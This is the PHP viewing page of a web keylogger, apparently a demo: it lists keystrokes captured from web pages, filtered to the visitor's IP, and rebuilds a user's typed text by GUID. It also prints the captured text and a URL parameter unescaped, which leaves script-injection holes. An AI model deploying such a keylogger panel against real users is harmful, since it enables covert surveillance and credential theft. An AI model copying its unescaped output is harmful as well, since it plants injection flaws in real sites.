<html>
<head>
<title> Keylogger resultats - Keylogger results</title>
</head>

<body>
<h1> Show data </h1>
<em> Merci de noter que vous ne pourrez voir ici que les 50 dernieres entrees dans les bases de donnes seulement pour VOTRE IP <b> (<?php echo $_SERVER['REMOTE_ADDR'] ?>) </b>. Ceci est fait pour respecter la securite des autres utilisateurs, ainsi que potentiellement la votre securite.</em>
<br/> <br/>
<em>
Please note that you will find here only the last 50 entries in the database for YOUR IP <b> (<?php echo $_SERVER['REMOTE_ADDR'] ?>) </b>. This will ensure the security of other users as well as you security.
</em>

<?php

include('CONFIGURATION.php');
// Now we put the information in MySQL

$link_to_db = new mysqli($HOST,$DB_LOGIN,$DB_PASSWORD,$DATABASE_NAME);
//If error when connecting to the datase
if(!$link_to_db){
  die("Not connected to database");
} 

$select_req='SELECT * FROM '.$TABLE_NAME.' WHERE IPAddress = ? ORDER BY DateAdded DESC LIMIT 50;';

echo '<br/> Requete : '.$select_req;

$prep_stmt = $link_to_db->stmt_init();
$prep_stmt->prepare($select_req);

//Success of the prepared statement
$from_ip=$_SERVER['REMOTE_ADDR'];
//Associate the parameters with the statement
$prep_stmt->bind_param('s',$from_ip);
$prep_stmt->bind_result($ip_db,$guid_db,$time_db,$wherefrom_db,$text_db);
$prep_stmt->execute();

echo "<table>";
echo "<tr>";

echo "<td>";
echo "<b> IP </b>";
echo "</td>";

echo "<td>";
echo "<b> GUID </b>";
echo "</td>";

echo "<td>";
echo "<b> Page source </b>";
echo "</td>";

echo "<td>";
echo "<b> Date </b>";
echo "</td>";

echo "<td style=\"max-width:400px;\">";
echo "<b> Text</b>";
echo "</td>";
echo "</tr>";

// For each line from the database print all the information
while($prep_stmt->fetch()){
  echo "<tr>";
  
  echo "<td style=\"max-width:400px;\">";
  echo $ip_db;
  echo "</td>";
  
  
  echo "<td style=\"max-width:400px;\">";
  echo '<a href=\''.$_SERVER['PHP_SELF'].'?guid='.$guid_db.'\'>'.$guid_db.'</a>';
  echo "</td>";
  
  echo "<td style=\"max-width:400px;\">";
  echo $wherefrom_db;
  echo "</td>";
    
  echo "<td>";
  echo $time_db;
  echo "</td>";
  
  echo "<td style=\"max-width:400px;\">";
  echo $text_db;
  echo "</td>";
  echo "</tr>"; 
}  
echo "</table>";
$prep_stmt->close(); 


?>

<?php 

$info_path_req='SELECT * FROM '.$TABLE_NAME.' WHERE GUID_like = ? ORDER BY DateAdded LIMIT 200;';
/*
 * View path
 * 
 */
$guid_path=$_GET['guid'];
if(!empty($guid_path)){
  echo '<br/><h2>Reconstruction GUID</h2>';
  echo '<em>(Requete : '.$info_path_req.')</em>';

  $guid_path_stmt = $link_to_db->stmt_init();
  $guid_path_stmt->prepare($info_path_req);
  $guid_path_stmt->bind_param('s',$guid_path);
  $guid_path_stmt->bind_result($ip_db,$guid_db,$time_db,$wherefrom_db,$text_db);
  $guid_path_stmt->execute();
  echo '<br/>L\'utilisateur associe au guid ('.$guid_path.') a dit :<br/>';
  while($guid_path_stmt->fetch()){
    echo $text_db;
  }
}
?>
</body>


</html>